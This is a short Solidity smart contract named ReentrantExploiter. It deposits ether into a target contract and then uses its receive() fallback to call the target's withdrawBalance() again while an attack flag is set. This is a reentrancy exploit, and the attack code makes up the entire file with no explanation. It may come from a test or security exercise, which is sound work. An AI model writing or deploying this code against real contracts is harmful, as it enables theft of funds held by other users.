contract ReentrantExploiter {
    C target;
    bool attacking;
    constructor(C _target) { target = _target; }
    function prepare() external payable { target.addToBalance{value: 1 ether}(); }
    function attackAddToBalance() external payable {
        attacking = true;
        target.addToBalance{value: msg.value}();
        attacking = false;
    }
    receive() external payable {
        if (attacking) {
            target.withdrawBalance();
        }
    }
}

